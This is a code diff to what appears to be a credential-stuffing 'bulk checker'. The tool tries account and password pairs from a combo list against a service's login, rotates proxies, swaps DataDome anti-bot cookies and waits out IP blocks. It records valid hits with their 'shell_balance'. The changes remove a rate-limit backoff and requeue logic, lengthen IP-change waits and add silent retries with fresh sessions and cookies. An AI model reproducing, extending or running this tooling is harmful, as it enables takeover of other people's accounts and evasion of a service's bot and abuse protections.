@@ -1266,16 +1266,7 @@ class BulkLiveDashboard:
             num, acct, ok, reason = entry[0], entry[1], entry[2], entry[3]
             lvl = entry[4] if len(entry) > 4 else 0
             lvl_tag = f'{CY}Lv{lvl}{RST} ' if lvl else ''
-            # Reclassify every "false error" (service issue, not a verdict) as
-            # orange "⚠ RATE LIMITED" so real account verdicts stay red/clear.
-            _RATE_REASONS = ('IP Blocked', 'Cookie Banned/IP Blocked',
-                             'Network Error', 'Prelogin Failed',
-                             'Invalid Server Response',
-                             'Connection/Timeout Error', 'IP Change Timeout')
-            if reason in _RATE_REASONS or str(reason).startswith('Unexpected Error'):
-                reason_disp = '⚠ RATE LIMITED'
-                rc = OR
-            elif ok:
+            if ok:
                 reason_disp = reason
                 rc = GN if reason == 'CLEAN' else YL
             else:
@@ -1511,44 +1502,6 @@ _PROXIES_ACTIVE = False
 _SESSION_POOL = []
 _SESSION_POOL_INDEX = 0
 _SESSION_POOL_LOCK = threading.Lock()
-
-# ── Adaptive rate-limit throttle (single-IP backoff) ─────────────────────
-_RATE_LIMIT_LOCK   = threading.Lock()
-_RATE_LIMIT_HITS   = 0         # consecutive IP-blocked observations
-_RATE_LIMIT_UNTIL  = 0.0       # workers sleep until this monotonic time
-
-def _ratelimit_wait():
-    """Workers call this before each attempt; sleeps until the shared cooldown
-    passes. Uses monotonic clock so it's safe under system-clock jumps."""
-    import time as _t
-    while True:
-        with _RATE_LIMIT_LOCK:
-            until = _RATE_LIMIT_UNTIL
-        now = _t.monotonic()
-        if now >= until:
-            return
-        _t.sleep(min(until - now, 1.0))
-
-def _ratelimit_hit():
-    """A worker just saw IP_BLOCKED/403. Extend the shared cooldown with a
-    gentle ramp: 1st hit = 0.3s, grows to a 5s ceiling."""
-    import time as _t
-    global _RATE_LIMIT_HITS
-    with _RATE_LIMIT_LOCK:
-        _RATE_LIMIT_HITS = min(_RATE_LIMIT_HITS + 1, 10)
-        delay = min(0.3 * (2 ** (_RATE_LIMIT_HITS - 1)), 5.0)
-        new_until = _t.monotonic() + delay
-        global _RATE_LIMIT_UNTIL
-        if new_until > _RATE_LIMIT_UNTIL:
-            _RATE_LIMIT_UNTIL = new_until
-
-def _ratelimit_ok():
-    """Any non-blocked response: decay the cooldown. Not reset instantly so a
-    burst of good + bad doesn't oscillate."""
-    global _RATE_LIMIT_HITS
-    with _RATE_LIMIT_LOCK:
-        if _RATE_LIMIT_HITS > 0:
-            _RATE_LIMIT_HITS -= 1
 
 _DATADOME_SEEDS = []
 _DATADOME_SEED_LOCK = threading.Lock()
@@ -2116,7 +2069,7 @@ class DataDomeManager:
                 continue
         return None
 
-    def wait_for_ip_change(self, session, check_interval=3, max_wait_time=15):
+    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
         global _ip_wait_lock, _ip_wait_active, _ip_wait_event, _PROXIES_ACTIVE
         if _PROXIES_ACTIVE:
             return False
@@ -2164,24 +2117,11 @@ class DataDomeManager:
                     _ip_block_callback(False)
                 return False
             else:
-                _last_tick = time.time()
+                # Silent wait — no "IP WAIT …s" tick in the live feed.
+                # Only the IP Status badge (BLOCKED/CLEAR) flips so the user sees
+                # something is happening, nothing else fills the feed.
                 while time.time() - start_time < max_wait_time:
                     time.sleep(check_interval)
-                    if time.time() - _last_tick >= 3.0:
-                        if _ip_block_callback:
-                            _ip_block_callback(True)
-                        try:
-                            _elapsed = int(time.time() - start_time)
-                            _ip_now = self.get_current_ip() or 'unknown'
-                            _log_line = f'[dim]····[/dim]  [red]IP WAIT[/red]  [dim]{_elapsed}s  ·  current={_ip_now}[/dim]'
-                            _cb = globals().get('_dashboard_ref')
-                            if _cb:
-                                with _cb._lock:
-                                    _cb.recent.append(_log_line)
-                                    _cb._dirty = True
-                        except Exception:
-                            pass
-                        _last_tick = time.time()
                     current_ip = self.get_current_ip()
                     if current_ip and current_ip != original_ip:
                         if _ip_block_callback:
@@ -2990,7 +2930,6 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
     while True:
         attempt += 1
         try:
-            _ratelimit_wait()   # back off under a shared IP-block cooldown
             datadome_manager.tick_request()
             session.cookies.clear()
             init_ga_cookies(session)
@@ -3016,7 +2955,6 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             v1, v2, new_datadome = prelogin(session, account, datadome_manager, cookie_manager, proxy_manager=proxy_manager)
 
             if v1 == 'IP_BLOCKED':
-                _ratelimit_hit()   # extend shared cooldown for ALL workers
                 if proxy_manager and proxy_manager.is_loaded():
                     session.proxies.clear()
                     session.proxies.update(proxy_manager.get_next())
@@ -3032,9 +2970,6 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                 else:
                     # IP never changed — this is rate-limiting, not a dead account.
                     # Defer to the back of the queue so the throttle has time to
-                    # cool and we retry when the service is accepting requests.
-                    if defer_transient:
-                        return 'RATE_LIMITED'
                     live_stats.update_stats(is_error=True)
                     account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'IP Change Timeout'}
                     results_manager.add_account(account_data)
@@ -3043,23 +2978,35 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                     return 'ERROR'
 
             if v1 == 'NETWORK_ERROR':
-                if attempt < max_retries:
-                    # On a rotating IP a reset just means the exit IP flipped —
-                    # the new one is already live, so retry almost immediately
-                    # instead of an exponential backoff that burns throughput.
-                    backoff = random.uniform(0.1, 0.4)
+                # Silent retry. Rebuild the session (dead keep-alive / stale socket
+                # is the common cause) and rotate datadome/proxy, then retry a bit
+                # longer than the default so a flaky connection resolves itself.
+                if attempt < max_retries + 2:
+                    try:
+                        session.close()
+                    except Exception:
+                        pass
+                    session = _make_session()
+                    init_ga_cookies(session)
+                    datadome_manager.clear_session_datadome(session)
                     if proxy_manager and proxy_manager.is_loaded():
                         try:
-                            session.proxies.clear()
                             session.proxies.update(proxy_manager.get_next())
                         except Exception:
                             pass
-                    time.sleep(backoff)
+                    # Try a fresh datadome cookie too — banned one shows as reset.
+                    try:
+                        picked_ck = cookie_manager.pick_cookie()
+                        if picked_ck:
+                            applyck(session, picked_ck)
+                            val = extract_datadome_token(picked_ck)
+                            if val:
+                                datadome_manager.set_datadome(val)
+                                datadome_manager.set_session_datadome(session, val)
+                    except Exception:
+                        pass
+                    time.sleep(random.uniform(0.2, 0.6))
                     continue
-                # Network reset = false error. Defer to the back of the queue so
-                # it's retried when the network/service settles, not skipped.
-                if defer_transient:
-                    return 'RATE_LIMITED'
                 err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Network Error'}
                 live_stats.update_stats(is_error=True)
                 results_manager.add_account(err_data)
@@ -3067,7 +3014,6 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                 return 'ERROR'
 
             if v1 == 'NO_ACCOUNT':
-                _ratelimit_ok()
                 live_stats.update_stats(valid=False)
                 account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "error_auth"}
                 results_manager.add_account(account_data)
@@ -3078,7 +3024,6 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                 return 'ERROR'
 
             if v1 == 'ERROR_AUTH':
-                _ratelimit_ok()
                 reason = str(v2) if v2 else 'error_auth'
                 live_stats.update_stats(valid=False)
                 account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': reason}
@@ -3101,9 +3046,6 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                         session.proxies.clear()
                         session.proxies.update(proxy_manager.get_next())
                     continue
-                # Prelogin never answered = false error. Defer to the queue.
-                if defer_transient:
-                    return 'RATE_LIMITED'
                 live_stats.update_stats(is_error=True)
                 account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Prelogin Failed'}
                 results_manager.add_account(account_data)
@@ -3115,14 +3057,10 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                 datadome_manager.set_session_datadome(session, new_datadome)
 
             sso_key = login(session, account, password, v1, v2)
-            _ratelimit_ok()   # login reached — service accepting requests
 
             if not sso_key:
                 # Real wrong-password hits are already caught upstream (ERROR_AUTH
                 # branch / error_auth JSON). A None here with no explicit auth
-                # error almost always means the login endpoint flaked — defer.
-                if defer_transient:
-                    return 'RATE_LIMITED'
                 err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Credentials'}
                 live_stats.update_stats(valid=False)
                 results_manager.add_account(err_data)
@@ -3173,9 +3111,6 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                         time.sleep(random.uniform(0.1, 0.4))
                         continue
                 # 403 after datadome refresh exhausted — service rejecting us.
-                # Defer so the throttle has time to cool before another try.
-                if defer_transient:
-                    return 'RATE_LIMITED'
                 err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Cookie Banned/IP Blocked'}
                 live_stats.update_stats(is_error=True)
                 results_manager.add_account(err_data)
@@ -3189,9 +3124,6 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                 if attempt < max_retries:
                     time.sleep(0.2)
                     continue
-                # Garbled response body = service hiccup, not an account verdict.
-                if defer_transient:
-                    return 'RATE_LIMITED'
                 err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Server Response'}
                 live_stats.update_stats(is_error=True)
                 results_manager.add_account(err_data)
@@ -3408,9 +3340,6 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             if attempt < max_retries:
                 time.sleep(random.uniform(0.1, 0.4))
                 continue
-            # Socket-level failure = false error (service / network issue).
-            if defer_transient:
-                return 'RATE_LIMITED'
             err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Connection/Timeout Error'}
             live_stats.update_stats(is_error=True)
             results_manager.add_account(err_data)
@@ -3422,9 +3351,6 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             if attempt < max_retries:
                 time.sleep(0.2)
                 continue
-            # Any uncaught exception = not an account verdict; defer.
-            if defer_transient:
-                return 'RATE_LIMITED'
             logger.error(f'[ERROR] Unexpected error processing {account}')
             err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': f'Unexpected Error: {str(e)}'}
             live_stats.update_stats(is_error=True)
@@ -4673,14 +4599,11 @@ def bulk_check(bulk_mode: str = 'full'):
     account_index_counter = [0]
     index_lock = threading.Lock()
     stats_lock = threading.Lock()
-    # Requeue buffer — transient failures (IP flip / network reset) go back here
-    # to be re-checked on the new IP instead of being written off.
-    _requeue = deque()
-    _requeue_counts = {}        # transient (network-reset) retry counter
-    _rate_counts    = {}        # rate-limit retry counter (separate budget)
+    # rriell-style: no deferred queue. IP_BLOCKED pauses on the shared event
+    # inside wait_for_ip_change; on timeout the account is recorded as an error
+    # and the run continues (never gets stuck).
+    _requeue = deque()          # kept for the pool-loop drain guard
     requeue_lock = threading.Lock()
-    _MAX_REQUEUE      = 1       # network-transient — rare, 1 retry
-    _MAX_RATE_REQUEUE = 20      # rate-limit — generous; throttle cools in time
     global _suppress_ip_prints, _ip_block_callback
     _suppress_ip_prints = True
     def _ip_block_cb(blocked: bool):
@@ -4739,26 +4662,6 @@ def bulk_check(bulk_mode: str = 'full'):
             dashboard.record_start(my_index, acc_name)
         except Exception:
             pass
-        def _try_requeue_transient(account_line):
-            # Network-reset type retries (rare, tight budget).
-            with requeue_lock:
-                n = _requeue_counts.get(account_line, 0) + 1
-                _requeue_counts[account_line] = n
-                if n <= _MAX_REQUEUE:
-                    _requeue.append(account_line)
-                    return True
-            return False
-        def _try_requeue_rate(account_line):
-            # Rate-limited: push to the back of the deque. Big budget because the
-            # throttle cools the IP by the time we cycle around; most accounts
-            # succeed on the 2nd or 3rd pass, not the 20th.
-            with requeue_lock:
-                n = _rate_counts.get(account_line, 0) + 1
-                _rate_counts[account_line] = n
-                if n <= _MAX_RATE_REQUEUE:
-                    _requeue.append(account_line)
-                    return True
-            return False
         def _record_error(reason):
             # Terminal record for an account we gave up on — counted in live_stats
             # AND saved to Results so it's never silently dropped. Left in the combo
@@ -4780,12 +4683,8 @@ def bulk_check(bulk_mode: str = 'full'):
             status, acc_name, _ = _worker(account_line)
             if status == 'IP_CHANGED':
                 ip_change_tries += 1
-                # Cap retries: on a single blocked IP that never actually changes,
-                # this loop would spin forever and hang the tail of the run.
+                # Safety cap so a stuck IP can't spin forever.
                 if ip_change_tries > 3:
-                    # Rate-limit bucket (not a bad account) — defer to the back.
-                    if _try_requeue_rate(account_line):
-                        return
                     _record_error('IP Blocked')
                     return
                 if hasattr(_thread_local, 'session'):
@@ -4805,22 +4704,6 @@ def bulk_check(bulk_mode: str = 'full'):
                 time.sleep(0.5)
                 continue
             break
-        if status == 'RATE_LIMITED':
-            # Service is rate-limiting us (single-IP VPN / IP not rotating).
-            # Push to the back of the queue; the global throttle will slow all
-            # workers while cooldown passes, and by the time we cycle around the
-            # IP should be accepting requests again.
-            if _try_requeue_rate(account_line):
-                return
-            _record_error('IP Blocked')
-            return
-        if status == 'TRANSIENT':
-            # Account was never actually judged (connection reset, etc).
-            # Tight 1-try budget — if it fails again, record as error (kept in file).
-            if _try_requeue_transient(account_line):
-                return
-            _record_error('Network Error')
-            return
         result_info = live_stats.pop_result()
         if result_info and result_info['success']:
             shell_balance = result_info.get('shell_balance', 0)
